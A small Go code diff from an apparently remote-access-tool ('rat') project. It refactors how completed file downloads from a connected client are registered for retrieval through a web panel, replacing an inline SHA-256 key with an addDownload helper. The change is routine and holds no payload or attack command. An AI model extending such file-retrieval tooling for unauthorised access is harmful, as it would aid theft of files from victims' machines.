@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"io"
 	"os"
-	"rat/command/utils"
 	"rat/common"
 
 	"path/filepath"
@@ -70,11 +69,10 @@ func (packet DownloadPacket) Read(c *Client) error {
 
 		if transfer.Complete() && final {
 			// Set temp file mapping so that we can download it from the web panel
-			tempKey := utils.Sha256(file)
-			TempFiles[tempKey] = TempFile{
+			tempKey := addDownload(TempFile{
 				Path: transfer.Local.Name(),
 				Name: filepath.Base(file),
-			}
+			})
 
 			e.Key = tempKey
 		}
